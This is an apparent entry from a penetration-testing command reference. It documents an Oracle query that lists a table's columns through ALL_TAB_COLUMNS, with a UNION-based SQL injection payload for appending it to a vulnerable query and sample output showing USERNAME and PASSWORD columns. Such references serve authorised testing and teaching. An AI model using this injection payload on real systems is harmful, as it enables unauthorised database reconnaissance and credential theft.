---
type: command
executor: sql
data: SELECT column_name FROM all_tab_columns WHERE table_name = '$_TABLE_NAME';
tags:
  - oracle
  - sqli
  - enumeration
platforms:
  - Database
  - Oracle
verified: true
validated: true
---

# oracle-sql-enumerate-columns-by-table

## Command

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = '$_TABLE_NAME';
```

## Description

This SQL command queries the ALL_TAB_COLUMNS system view to retrieve all column names for a specified table in an Oracle database. It is used in SQL injection scenarios to map table structures during reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TABLE_NAME | The name of the target table (uppercase recommended) | Yes |

## Examples

### Basic Usage

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';
```

### In SQL Injection Context

Append to a vulnerable query: `' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS' --`

## Expected Output

A list of column names for the table:

COLUMN_NAME
------------
USERNAME
PASSWORD
EMAIL

If no columns are found, an empty result set is returned.

## Related

- [[procedures/Oracle-SQL-Column-Enumeration]]
- [[commands/oracle-sql-enumerate-columns-by-table-and-owner]]
